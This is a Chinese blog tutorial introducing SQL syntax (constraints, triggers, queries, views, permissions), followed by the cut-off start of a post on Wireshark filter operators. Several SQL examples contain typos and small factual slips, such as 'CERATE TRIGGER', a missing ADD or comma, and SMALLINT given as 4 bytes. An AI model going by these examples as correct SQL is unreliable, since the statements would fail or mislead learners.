CHAR(n) 长度为n的字符型 VARCHAR(n) 最大长度为n的变长字符型 NUMBER(n) 长度为n的数字型 INT 长整型(4B) SMALLINT 短整型(4B) BIGINT 大整型(8B) FLOAT(n) 精度至少为n位的浮点数 DATE 日期，格式为YYYY-MM-DD TIME 时间，格式为HH:MM:SS 列级完整性约束条件 约束条件 意义 PRIMARY KEY 主码（元素唯一不能重复）：当只有一个主码时，可直接在对应的属性列标注 NOT NULL 非空：表示该属性列不能取空值 UNIQUE 唯一值：表示该属性列只能取唯一值 CHECK 检查：检查该列是否满足某个条件，比如CHECK(某属性\u0026gt;20) 表级完整性约束条件 约束条件 意义 PRIMARY KEY(列名1,\u0026hellip;,列名n) 多个主码：当主码由多个属性构成时，\n必须作为表级完整性定义 FOREIGN KEY(列名1) REFERENCES 被参照表(列名1) 外码：被参照的列必须是 PRIMARY KEY 或 UNIQUE 约束 的列，\n本表所有值来源于被参照的列 特殊完整性约束条件——断言 相较于列级的CHECK语句，断言能指定更一般的约束\n创建断言 CREATE ASSERTION 断言名 CHECK字句;\neg.限制A课程最多60人选修：\nCREATE ASSERTION ASSE CHECK(60\u0026gt;= SELECT COUNT(*) FROM TAB1,TAB2 WHERE TAB1.NUM=TAB2.NUM AND TAB2.CLASS=\u0026#34;A\u0026#34;); -- 此处具体操作原理往后看 删除断言 DROP ASSERTION 断言名;\n特殊完整性约束条件——触发器 触发器是用户定义在关系表上的一类由事件驱动的特殊过程\n表的拥有者才能在表上创建触发器\n触发器只能定义在基本表上，不能定义在视图上\n定义触发器 CREATE TRIGGER 触发器名\n{BEFORE|AFTER} 触发事件 ON 表名\nREFERENCING NEW|OLD ROW AS 变量\nFOR EACH {ROW|STATEMENT}\n[WHEN 触发条件]触发动作体\n触发事件：INSERT DELETE UPDATE 或者他们的组合\n还可以UPDATE OF\u0026lt;触发列1,...\u0026gt;，即进一步指明修改哪些列时激活触发器 BEFORE/AFTER：触发时机，表示在触发事件的操作执行之前激活触发器\nROW/STATEMENT：指明是行级/语句级触发器，行级有多少行就触发多少次，语句级只触发一次\n触发条件：只有触发条件为真时才执行动作体，省略WHEN则立即执行动作体\n触发动作体：行级可以使用NEW/OLD引用事件之后的新值和事件之前的旧值，语句级不行\neg.对TAB1的Grade属性修改时，若增加了10%，则将操作记录在TAB2(Name,OldGrade,NewGrade)中\nCERATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW WHEN(NewTuple.Grade\u0026gt;=1.1*OldTuple.Grade) INSERT INTO TAB2(Name,OldGrade,NewGrade) VALUES(OldTuple.Name,OldTuple.Grade,NewTuple.Grade); 如果触发器内有多个语句，要定义新的定界符（不常用的），并使用BEGIN和END包裹：\n-- 1. 将定界符从 ; 改为 // DELIMITER // -- 2. 定义包含多条语句的触发器 CREATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW BEGIN -- 检查条件 IF (NewTuple.Grade \u0026gt;= 1.1 * OldTuple.Grade) THEN -- 这是块内的第一条语句，用 ; 结尾 INSERT INTO TAB2(Name, OldGrade, NewGrade) VALUES(OldTuple.Name, OldTuple.Grade, NewTuple.Grade); END IF; -- IF语句也需要用 ; 结尾 -- 3. 使用新的定界符 // 来结束整个 CREATE TRIGGER 命令 END // -- 4. 将定界符改回默认的 ; DELIMITER ; 激活触发器 多个触发器执行顺序：\n执行BEFORE触发器 -\u0026gt; 激活触发器的SQL语句 -\u0026gt; 执行AFTER触发器\n删除触发器 DROP TRIGGER 触发器名 ON 表名;\n定义基本表 CREATE TABLE 表名 (列名1 数据类型 列级完整性约束条件, 列名n 数据类型 列级完整性约束条件, 表级完整性约束条件1, 表级完整性约束条件n );\neg:\nCREATE TABLE TAB1 (Ch VARCHAR(10), Nu NUMBER(10), Grade INT NOT NULL, PRIMARY KEY(Ch,Nu), -- 多个主码 FOREIGN KEY(Ch) REFERENCES TAB2(Ch) ); 在模式中定义表 一个模式包含很多基本表，有三种方式在模式里面定义基本表\n创建表的时候指出模式 CREATE TABLE 模式名.表名();\n创建模式时直接定义表 CREATE SCHEMA 模式名 AUTHORIZATION 用户名 CREATE TABLE 表名();\n事先设置所属的模式 SET SCHEMA \u0026lsquo;my_schema\u0026rsquo;\neg.\nSET SCHEMA \u0026#39;my_schema\u0026#39;; CREATE TABLE my_table ( id INT PRIMARY KEY, name VARCHAR(100) ); my_table 将被创建在 my_schema 模式下\n修改基本表 同样的，修改表时想要指定模式里面的表，就使用“模式名.表名”的方式指定表名\n增加新的属性列 ALTER TABLE 表名 ADD 新列名 数据类型 完整性约束条件;\neg.向TAB1里增加时间列Time：\nALTER TABLE TAB1 ADD Time DATE; 当然，还能在ADD后面加上修饰词COLUMN，这样会更容易理解是在添加列，对功能没有影响：\nALTER TABLE TAB1 COLUMN Time DATE; ~~~~~~ 增加列级完整性约束条件 ALTER TABLE SC ADD 列级完整性约束条件;\neg.向TAB1里增加Grade列必须取唯一值的条件：（Grade必须要已经存在）\nALTER TABLE TAB1 ADD UNIQUE(Grade); 增加表级完整性约束条件 ALTER TABLE SC ADD 表级完整性约束条件;\neg.向TAB1里增加Ch为外码的条件，参照表是TAB2：\nALTER TABLE TAB1 ADD FOREIGN KEY(Ch) REFERENCES TAB2(Ch); 删除列 ALTER TABLE 表名 DROP CASCADE;\n级联：引用了该列的其他对象（例如视图）一起删除\nALTER TABLE 表名 DROP RESTRICT;\n限制：若该列被其他对象引用，则拒绝删除\n删除指定的完整性约束条件 ALTER TABLE 表名 DROP CONSTRAINT 完整性约束名 CASCADE/RESTRICT;\n修改列 ALTER TABLE 表名 ALTER COLUMN 列名 数据类型;\neg.把Grade由INT型修改成字符型：\nALTER TABLE 表名 ALTER COLUMN 列名 数据类型； 删除基本表 DROP TABLE 表名 CASCADE;\n级联：把表相关的依赖对象（比如视图）一并删除\nDROP TABLE 表名 RESTRICT;\n限制：如果此表被其他表依赖（外码）或者有视图等，拒绝被删除\n索引 建立索引 建立唯一索引 CREATE UNIQUE INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n唯一索引 是关于数据值是否唯一的，它强制数据的唯一性，并帮助快速查找特定值\neg.为表TAB1按照学号升序和时间降序建立唯一的索引：\nCREATE UNIQUE INDEX NewIndex ON TAB1(Nu ASC,Time DESC); ASC：asceding，升序 DESC：descending，降序\n建立聚簇索引 CREATE CLUSTER INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n聚簇索引 是关于数据如何物理存储的，它把数据和索引紧密地绑定在一起，让查找和范围查询非常快\n重命名索引 ALTER INDEX 旧索引名 RENAME TO 新索引名;\neg.把TAB1表的NewIndex索引重命名为OldIndex：\nALTER INDEX NewIndex RENAME TO OldIndex; 删除索引 DROP INDEX 索引名;\n查询数据\u0026ndash;SELECT语句 一般格式 SELECT ALL/DISTINCT 目标列表达式\nFROM 表名/视图名\nWHERE 条件表达式\nGROUP BY 列名 HAVING 条件表达式\nORDER BY 列名 次序;\nSELECT 目标列表达式 查询指定的列 SELECT 列名1，列名n\neg.查询TAB1的Ch列和Nu列：\nSELECT Ch,Nu FROM TAB1; 查询全部的列 SELECT *\neg.查询TAB1的全部记录：\nSELECT * FROM TAB1; 查询计算后的值 SELECT 表达式\n表达式可以是算术表达式（+、-\u0026hellip;)，字符串常量，函数等等\neg.查询TAB1里面所有Grade减去2的值：\nSELECT Grade-2 FROM TAB1; 改变查询结果的列标题 SELECT 列名 别名\neg.查询TAB1里面的Ch列和Nu列，在结果里面使用Chinese和Num显示\nSELECT Ch Chinese,Nu Number FROM TAB1; 去除查询结果的重复行 SELECT DISTINCT 列名\n如果没有使用DISTINCT，默认为ALL\n聚集函数 聚集函数只处理非空值\n聚集函数只能用于SELECT语句和CROUP BY中的HAVING子句\n统计元组个数 COUNT(*)\n某个元组的一个或者部分取空值的时候，不影响统计结果\neg.查询TAB1里面的总数：\nSELECT COUNT(*) FROM TAB1; 统计某一列值的个数 COUNT(DISTINCT/ALL 列名)\n指定DISTINCT会去重，NULL不计入总数\n计算某一列值的平均数（该列必须为数值型） AVG(DISTINCT/ALL 列名)\neg.查询TAB1里面的Grade平均值：\nSELECT AVG(ALL Grade) FROM TAB1; 计算某一列值的总和（该列必须为数值型） SUM(DISTINCT/ALL 列名)\n计算某一列值的最大值/最小值 MAX/MIN(DISTINCT/ALL 列名)\nWHERE 条件表达式 比较大小 WHERE 列名 运算式\n常用运算符：=\t\u0026gt;\t\u0026lt;\t\u0026gt;=\t\u0026lt;=\t!=/\u0026lt;\u0026gt;\t!\u0026gt;\t!\u0026laquo;/mark\u0026gt;\neg.查询TAB1里面所有三年级（Grade=3）的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade=3; eg.查询TAB1里面所有学号2300开头学生（Nu\u0026gt;23000）的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu\u0026gt;23000; 确定范围 WHERE 列名 BETWEEN 最小值 AND 最大值\nWHERE 列名 NOT BETWEEN 最小值 AND 最大值\neg.查询TAB1里面年级在1到3之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade BETWEEN 1 AND 3; eg.查询学号不在23000到24000之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE NOT Nu BETWEEN 23000 AND 24000; 确定集合 WHERE 列名 IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\nWHERE 列名 NOT IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\neg.查询学号不是23001也不是23002的学生年级：\nSELECT Grade FROM TAB1 WHERE Nu NOT IN (\u0026#39;23001\u0026#39;,\u0026#39;23002\u0026#39;); 相当于多重条件查询的=语句\n字符匹配 百分号 % 表示任意长度的字符串(类似正则.*)，比如a%b就是以a开头，b结尾的任意长度字符串\n下划线 _ 表示单个字符，比如a_ _ _b（不用空格，这里方便看）是以a开头b结尾的长度为5的字符串\n在ASCII码表里，一个汉字长度为2，需要两个下划线\n反斜杠 \\ 表示转义，跟在 % 和 _ 前面（\\% 、\\_）让他们变成普通字符而非通配符\n使用 ESCAPE \u0026lsquo;符号\u0026rsquo; 设置转义字符，但一般使用反斜杠 根据环境决定要不要加上ESCAPE（有的数据库默认由\\转义）\nWHERE 列名 LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\nWHERE 列名 NOT LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\neg.查询TAB1中姓名满足a%i_e的学生的年级：\nSELECT Grade FROM TAB1 WHERE Ch LIKE \u0026#39;a%i_e\u0026#39;; 空值查询 WHERE 列名 IS NULL\nWHERE 列名 IS NOT NULL\neg.查询TAB1中缺少学号的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu IS NULL; 多重条件查询 WHERE 条件表达式1 AND 条件表达式2\nWHERE 条件表达式1 OR 条件表达式2\n可以把AND和OR组合使用，其中AND优先级大于OR\nGROUP BY 列名 HAVING 条件表达式 用于将查询结果按某一列或多列的值分组，值相等的为一组 目的是细化聚集函数的作用对象，分组后聚集函数将作用于每一个组，每一组都有一个函数值\nGROUP BY 列名 eg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM TAB1 GROUP BY Grade; 以Grade分组，在每一组中求取Ch的数量\nGROUP BY 列名 HAVING 筛选条件 HAVING用于从组中选择满足条件的组 WHERE用于从基本表或视图中选择满足条件的元组（注意：WHERE子句不可以接聚集函数）\neg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM .TAB1 GROUP BY Grade HAVING GRADE\u0026gt;=2; 以Grade分组，在每一组中求取Ch的数量\nORDER BY 次序 ORDER BY 列名1 列名n ASC\nORDER BY 列名1 列名n DESC\n如果不设置，默认升序（ASC）\neg.查询TAB1中学生的年级，按照降序排列：\nSELECT Grade FROM TAB1 ORDER BY GRADE DESC; 连接查询 两表连接查询 WHERE 表名1.列名1 比较运算符 表名2.列名2\n当列名在参与连接的各表中唯一时，可省去表名前缀\neg.查询TAB1和TAB2中所有数据，并在一个查询结果里面展示\nSELECT STUDY.TAB1.*,STUDY.TAB2.* FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; 若想获得自然连接，则列举全部属性列，并去掉一个相同的属性列即可。可以将上述SELECT语句改写如下：\nSELECT Ch,Grade,Cla,Hom,STUDY.TAB2.Nu -- 去掉了其中一个Nu FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; eg.在TAB1和TAB2里查询选了英语课，并且是三年级的学生的学号:\nSELECT STUDY.TAB1.Nu FROM STUDY.TAB1,STUDY.\u0026#34;tab2\u0026#34; WHERE CLA=\u0026#39;ENGLISH\u0026#39; AND GRADE=3; 单表连接查询 通过取两个别名，对同一个表进行自连接\neg.查询cla和cla2相同的学生学号：\nSELECT FIRST.*,SECOND.* FROM STUDY.TAB2 FIRST,STUDY.tab2 SECOND WHERE FIRST.CLA=SECOND.CLA2; 外连接查询 左外连接保留左表的所有记录，并尽可能地匹配右表中的记录 右外连接保留右表的所有记录，并尽可能地匹配左表中的记录\n将悬浮元组保留在结果关系中，没有属性值的位置填上NULL\nSELECT 列名 FROM 表名1 LEFT OUTER JOIN 表名2 ON(连接条件)\nSELECT 列名 FROM 表名1 RIGHT OUTER JOIN 表名2 ON(连接条件)\neg.以TAB1为主体，列出每个学生选课cla的结果\nSELECT STUDY.TAB1.Ch,CLA FROM STUDY.TAB1 LEFT OUTER JOIN STUDY.TAB2 ON(STUDY.TAB1.Nu=STUDY.TAB2.Nu); 此时会保留TAB1里面的所有记录，匹配对应的TAB2记录\n多表连接查询 WHERE 表名1.列名1 = 表名2.列名2 AND 表名2.列名2 = 表名3.列名3\n多表连接一般是先进行两个表的连接操作，再将其连接结果与第三个表执行连接\n嵌套查询 查询块：SELECT-FROM-WHERE 嵌套查询：将一个查询块嵌套在另一个查询块的WHERE子句或者HAVING子句 上层的查询块称为外层查询/父查询；下层的查询块称为内层查询/子查询 子查询的SELECT语句中不能使用ORDERBY子句，ORDERBY子句只能对最终查询结果排序\n集合判断IN子查询 WHERE 列名 IN (子查询)\neg.查询alice的年级：\nSELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39;; 查询结果为alice在三年级，再查找三年级的其他学生：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE=3; 上面两个查询结合为嵌套查询：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE IN (SELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39; ); 本例的子查询条件不依赖于父查询，这类子查询称为不相关子查询\n比较运算符子查询 WHERE 列名 比较运算符 (子查询)\n当明确知道子查询结果是单个值而不是集合的时候使用\neg．在SC表中，找出每个学生（Sno）超过他自己选修课程平均成绩（Grade）的课程号（Cno)\nSELECT Sno, Cno FROM SC x -- x是表 SC 的别名，又称为元组变量，可以用来表示 SC 的一个元组 WHERE Grade \u0026gt;= (SELECT AVG(Grade) FROM SC y WHERE y.Sno=x.Sno); 这里必须加上WHERE y.Sno=x.Sno这个条件，此时内外对应的sno才会相同，否则求的不是单个学生的平均成绩，而是所有学生的平均成绩\n本例的子查询条件依赖于父查询，这类子查询称为相关子查询，整个查询称为相关嵌套查询\nANY/ALL子查询 WHERE 列名 比较运算符 ANY/ALL (子查询)\n谓词 语义 与聚集函数或 IN 的等价转换 \u0026gt;ANY 大于子查询结果中的某个值 \u0026gt;MIN \u0026gt;ALL 大于子查询结果中的所有值 \u0026gt;MAX \u0026lt;ANY 小于子查询结果中的某个值 \u0026lt;MAX \u0026lt;ALL 小于子查询结果中的所有值 \u0026lt;MIN \u0026gt;=ANY 大于等于子查询结果中的某个值 \u0026gt;=MIN \u0026gt;=ALL 大于等于子查询结果中的所有值 \u0026gt;=MAX \u0026lt;=ANY 小于等于子查询结果中的某个值 \u0026lt;=MAX \u0026lt;=ALL 小于等于子查询结果中的所有值 \u0026lt;=MIN =ANY 等于子查询结果中的某个值 IN =ALL 等于子查询结果中的所有值（通常无实际意义） \u0026ndash; !=(或\u0026lt;\u0026gt;)ANY 不等于子查询结果中的某个值 \u0026ndash; !=(或\u0026lt;\u0026gt;)ALL 不等于子查询结果中的任何值 NOT IN eg.查询TAB1里面三年级学生学号大于23000的：\nSELECT Ch FROM STUDY.TAB1 WHERE Nu\u0026gt;=ANY (SELECT Nu FROM STUDY.\u0026#34;tab1\u0026#34; WHERE Grade=3 ); EXISTS子查询 EXISTS代表存在量词，对应的为NOT EXISTS\nEXISTS谓词的子查询不返回数据，只返回逻辑\u0026rsquo;true\u0026rsquo;和\u0026rsquo;false\u0026rsquo;\neg1.在SC表中查询至少选修了1号学生选修的全部课程（Cno）的学生的学号（Sno)\n查询学号为 x 的学生，对所有的课程 y，只要 1 号学生选修了课程 y，则 x 也选修了 y。\n令 p 表示\u0026quot;学生 1 号选修了课程 y\u0026quot;\n令 q 表示\u0026quot;学生 x 选修了课程 y\u0026quot;\n则上述查询可以表示为(∀y)p→q\n通过等价转换，可得(∀y)p→q ≡ ¬(∃y(¬(p→q))) ≡ ¬(∃y(¬(¬p∨q))) ≡ ¬∃y(p∧¬q)\n最终用 SQL 实现的表达式 ¬∃y(p∧¬q)，语义：不存在这样的课程 y，学生 1 号选修了 y，而学生 x 没有选修\nSELECT DISTINCT Sno FROM SC SCX WHERE NOT EXISTS (SELECT * -- 由EXISTS引I出的子查询，其目标列表达式通常都用* FROM SC SCY WHERE SCY.Sno=\u0026#39;1\u0026#39; AND NOT EXISTS (SELECT * FROM SC SCZ WHERE SCZ.Sno = SCX.Sno AND SCZ.Cno = SCY.Cno) -- 保证内外指向相同的学生 ); eg2.基于 SC 表，查询选修了全部课程（Course 表）的学生姓名（Student 表）\n令 p 表示\u0026quot;课程 x 被学生 y 选修了\u0026quot;，则有(∀x)p ≡ ¬(∃x(¬p))，语义：查询没有任何课程是其不选修的学生 y\nSELECT Sname FROM Student WHERE NOT EXISTS (SELECT * FROM Course WHERE NOT EXISTS (SELECT * FROM SC WHERE Sno=Student.Sno AND Cno=Course.Cno) ); 集合查询 多个SELECT语句的结果可以进行集合的并（UNION)、交（INTERSECT)、差（EXCEPT） 参加集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同\nUNION并操作（满足前者或满足后者） UNION合并查询结果时，系统会自动去掉重复元组，若需保留，则采用UNIONALL\neg.在TAB2中查询学号大于等于23003的学生和选择了MATH科目的学生\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;=23003 UNION SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; INTERSECT交操作（前后都满足） eg.在TAB2中查询选了MATH又选了history的学生\nSELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;history\u0026#39; OR CLA2=\u0026#39;history\u0026#39; INTERSECT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; EXCEPT差操作（满足前者，不满足后者） eg.在TAB2中查询学号大于23002的学生和选修了MATH的学生的差集\nSELECT * FROM STUDY.TAB2 WHERE Nu\u0026gt;23002 EXCEPT SELECT * FROM STUDY.TAB2 WHERE CLA=\u0026#39;MATH\u0026#39; OR CLA2=\u0026#39;MATH\u0026#39;; 基于派生表的查询 子查询出现在FROM子句时，子查询将生成临时的派生表，成为主查询的查询对象\nFROM (子查询) AS 别名 (属性列名1,属性列名2)\n如果子查询中没有聚集函数，派生表可以不指定属性列，子查询SELECT子句后面的列名为其默认属性 AS可以省略，但必须为派生表关系指定一个别名\neg1.找出每个学生超过他自己选修课程平均成绩的课程号\nSELECT Sno, Cno FROM SC, (SELECT Sno, Avg(Grade) FROM SC GROUP BY Sno ) AS Avg_sc(avg_sno, avg_grade) WHERE SC.Sno = Avg_sc.avg_sno AND SC.Grade\u0026gt; =Avg_sc.avg_grade; eg2.查询所有选修了1号课程的学生姓名\nSELECT Sname FROM Student, (SELECT Sno FROM SC WHERE Cno=\u0026#39;1\u0026#39; ) AS SC1 WHERE Student.Sno=SC1.Sno; 插入数据\u0026ndash;INSERT语句 插入元组 一般格式 INSERT\nINTO 表名(列名1,列名n)\nVALUES(常量1,常量n); //字符串常量要用单引号\u0026rsquo;\u0026lsquo;括起来\n假设现在有TAB1表，有C1到C4四列，其中C4列是字符串常量： 情况1：明确给出新增元组要在哪些属性上赋值（插入数据包含全部属性列） INSERT INTO TAB1(C1,C2,C3,C4) VALUES(1,2,3,\u0026#39;4\u0026#39;); 情况2：明确给出新增元组要在哪些属性上赋值（插入数据只包含部分属性列） INSERT INTO TAB1(C1,C2,C3) VALUES(1,2,3) 这种情况下C4列会被赋值NULL，如果C4有约束条件NOT NULL则会报错\n情况3：仅指出要在TAB1表上插入元组（插入数据包含全部属性列） INSERT INTO TAB1 VALUES(1,2,3\u0026#39;4\u0026#39;); 这种情况表示要在全部属性列上赋值，插入数据顺序必须和列的顺序对应\n情况4：仅指出要在TAB1表上插入元组（插入数据只包含部分属性列） INSERT INTO TAB1 VALUES(1,2,3,NULL); 这种情况必须明确未赋值的属性列为NULL\n插入子查询结果 一般格式 INSERT\nINTO TAB1(属性列1,属性列2)\n子查询;\neg.假设现有TAB1表（如上），并按C1列分组求C2列的平均值，并存入TAB2表（其中TAB2表的C1列存放 C1，avg_C2列存放C2列的均值)\nINSERT INTO TAB2 (C1, avg_C2) SELECT C1, AVG(C2) FROMTAB1 GROUP BY C1; 修改数据\u0026ndash;UPDATE语句 一般格式 UPDATE 表名\n==SET 列名1=表达式1,列名n=表达式n\nWHERE 条件;==\nWHERE语句若省略，则表示修改表中所有元组\n情况1：修改某一个元组的值 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1=1; 情况2：修改多个元组的值 UPDATE TAB1 SET C3=C3+1; 情况3：带子查询的修改语句 UPDATE TAB1 SET C4=\u0026#39;0\u0026#39; WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); 删除语句\u0026ndash;DELETE语句 一般格式 DELETE\nFROM 表名\nWHERE 条件;\nWHERE语句若省略，则表示删除表中所有元组\n情况1：删除某一个元组的值 DELETE FROM TAB1 WHERE C1=1; 情况2：修改多个元组的值 DELETE FROM TAB1 情况3：带子查询的修改语句 DELETE FROM TAB1 WHERE C1 IN (SELECT C1 FROM TAB2 WHERE avg_C2=2 ); VIEW 视图 建立视图 一般格式 CREATE VIEW 视图名 (列名1,列名n)\nAS 子查询\nWITH CHECK OPTION;\n若省略视图名后的列名，则该视图由子查询中SELECT的目标列字段组成\n若添加WITH句，则表示对视图进行增删改时要满足子查询中的条件表达式\n在以下情况中必须明确指定组成视图的列名： 1.某个目标列不是单纯的列名，而是聚集函数或列表达式 2.多表连接时选出了几个同名列作为视图的字段 3.需要在视图中为某个列启用新的更合适的名字\n行列子集视图：由单个基本表导出，仅去掉了基本表的某些行和某些列，但保留了主码\n若某些视图是建立在另一个表的全部属性列上的（视图与基本表的各列是一一对应的）那么当修改基本表的结构时，基本表和视图的映像关系会被破坏。这种情况最好在修改基本表后删除该视图，然后重建该视图\n情况1：建立完全视图 eg1.建立C1为1时TAB1的视图\nCREATE VIEW V_TAB1 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C1=1; 情况2：建立带有增删改条件的视图 eg2.建立C4为4时TAB1的视图，并且以后每次增删改时都要满足C4=4\nCREATE VIEW V_TAB2 AS SELECT C1,C2,C3,C4 FROM TAB1 WHERE C4=\u0026#39;4\u0026#39; WITH CHECK OPTION; 情况3：由视图新建视图 eg3.建立在一个或多个已定义的视图上\nCREATE VIEW V_TAB3 AS SELECT C1,C2,C3 FROM V_TAB1 WHERE C2=2; 情况4：带有派生数据的视图 减少冗余数据，定义基本表时一般只存放基本数据。当需要使用计算得出的派生数据时，可以设置在视图 中的派生属性列上，也称为虚拟列。带虚拟列的视图也称为带表达式的视图\neg4.建立有派生数据的视图\nCREATE VIEW V_TAB4(C1,new_C2) AS SELECT C1,10+C2 FROM TAB1; 情况5：带有聚集函数和GROUP BY的分组视图 eg5.建立包含聚集函数的分组视图\nCREATE VIEW V_TAB5(C1,avg_C2) AS SELECT C1,AVG(C2) FROM TAB1; GROUP BY C1; 删除视图 DROP VIEW 视图名 CASCADE;\n如果使用了CASCADE级联删除语句，则将把该视图导出的所有视图一并删除\n查询和更新视图 视图定义后，对视图进行查询和更新的语句和语法与基本表相同 视图的查询与更新最终都会转换为对基本表的查询和更新，这一过程也被称为视图消解 一般来说，行列子集视图的查询和更新都可以顺利转换，其他则不一定\n空值 判断属性为空值 这部分和WHERE语句里面空值判断一样啦\n属性 IS NULL;\n属性 IS NOT NULL;\neg.查找TAB1中名字为空的学生：\nSELECT * FROM STUDY.TAB1 WHERE Ch IS NULL; 空值的运算 算数运算 空值与另一个值的算术运算结果为空值\nSELECT 5 + NULL; -- 结果为 NULL SELECT 10 / NULL; -- 结果为 NULL 比较运算 空值与另一个值的比较运算结果为 UNKNOWN\nSELECT 5 = NULL; -- 结果为 UNKNOWN SELECT 5 \u0026lt;\u0026gt; NULL; -- 结果为 UNKNOWN SELECT 5 \u0026gt; NULL; -- 结果为 UNKNOWN 在查询语句中的处理 在查询语句中，只有使WHERE和HAVING子句的选择条件为TRUE的元组才会被选出作为输出结果（即不包括UNKNOWN的情况)\neg1:\nSELECT * FROM employees WHERE salary \u0026gt; 50000 AND commission IS NOT NULL; 这个查询会返回所有工资大于 50000 且佣金不为 NULL 的员工记录\neg2:\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0; 查询过程中commission可能为NULL，这部分运算后产生UNKNOWN，对应元组会被忽略\n要让所有都能被输出，最好做如下改动：\nSELECT * FROM employees WHERE commission \u0026lt;\u0026gt; 0 OR commission IS NULL; 数据库安全 授权 授予用户权限 GRANT 权限 ON 对象类型 对象名 TO 用户名 [WITH GRANT OPTION];\n权限：查询权限 SELECT，全部操作权限 ALL PRIVILEGES\n对象类型：TABLE/VIEW\n对象名：表和视图的名称\n用户名：可以指定用户，也可以全体用户PUBLIC\n如果没有WITH GRANT OPTION语句，那么用户不能传播这个权限\nSQL不允许循环授权，被授权者不能把权限传递给授权者或其祖先\neg.假设我们有一个名为employees的表，现在想让用户user_A只能查询这张表\nGRANT SELECT ON TABLE employees TO user_A; 如果要让A还能把权限授权给别人：\nGRANT SELECT ON TABLE employees TO user_A WITH GRANT OPTION; 收回用户权限 REVOKE 权限 ON 对象类型 对象名 FROM 用户名 [CASCADE/RESTRICT];\nCASCADE：级联回收，把用户传播出去的权限一并收回\nRESTRICT：受限回收，如果用户传播过该权限，回收会失败（默认行为）\neg.收回user_A的权限\nREVOKE SELECT ON TABLE employees FROM user_A; 创建数据库模式的权限 对创建数据库模式一类的数据库对象的授权在数据库管理员创建用户的时候实现\nCREATE USER 用户名 [WITH DBA|RESOURCE|CONNECT];\nDBA：可以创建新用户、模式、表、视图等，还可以把这些权限授予其他用户\nRESOURCE：可以创建表、视图，但是不能创建新的模式和用户\nCONNECT：只能登录数据库，或者被授予权限后操作\n数据库角色 角色是权限的集合，可以为一组相同权限的用户创建同一个角色，使用角色管理权限，简化授权过程\n创建角色 CREATE ROLE 角色名;\n给角色添加角色/用户 GRANT 角色 TO 某角色/某用户 [WITH ADMIN OPTION];\n给角色授权 GRANT 权限 ON 对象类型 对象名 TO 角色；\n收回角色权限 REVOKE 权限 ON 对象类型 对象名 FROM 角色;\n","date":"2025-06-03T01:14:02+08:00","image":"http://picture.928330.xyz/typora/SQL-logo.png","permalink":"https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/","title":"快速入门SQL"},{"content":"wireshark过滤语法 运算符 比较运算符 操作符 别名 类C风格 描述 示例 eq any_eq == 等于 ip.src == 10.0.0.5 ne all_ne != 不等于 ip.src != 10.0.0.5 all_eq === 全等 ip.src === 10.0.0.5 any_ne !== 不全等 ip.src !== 10.0.0.5 gt \u0026gt; 大于 frame.len \u0026gt; 10 lt \u0026lt; 小于 frame.len \u0026lt; 128 ge \u0026gt;= 大于或等于 frame.len ge 0x100 le \u0026lt;= 小于或等于 frame.len \u0026lt;= 0x20 contains 协议、字段或切片包含某个值 sip.To contains \u0026ldquo;a1762\u0026rdquo; matches ~ 右侧的正则表达式将被用来匹配左侧的字符串 http.host matches \u0026ldquo;acme.(org|com|net)\u0026rdquo; 等于（==）和全等（===）的区别：\n== 是一种宽松的比较，只要有一个值匹配即可（any if more than one）\n=== 是一种严格的比较，所有可能的值都必须匹配（all if more than one）\n同一个包，使用等于（==）可以过滤出源或目的端口为80报文，使用全等（===）则会匹配源目的端口都为80的报文\nip.addr == 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 || ip.dst==10.0.0.0/8 ip.addr === 10.0.0.0/8 等价于 ip.src==10.0.0.0/8 \u0026amp;\u0026amp; ip.dst==10.0.0.0/8 逻辑运算符 操作符 类C风格 描述 示例 and \u0026amp;\u0026amp; 逻辑与 ip.src == 10.0.0.5 and tcp.flags.fin == 1 or || 逻辑或 ip.src == 10.0.0.5 or ip.src == 192.1.1.1 xor ^^ 逻辑异或，能且只能满足其中一个 tr.dst[0:3] == 0.6.29 xor tr.src[0:3] == 0.6.29 not ! 逻辑非 ! udp […] 不涉及 [a:b]：从第a个字符开始取b个字符 http.request.method**[0:3]**==\u0026ldquo;GET\u0026rdquo; in 不涉及 匹配集合内的元素，代替== http.request.method in {\u0026ldquo;HEAD\u0026rdquo;, 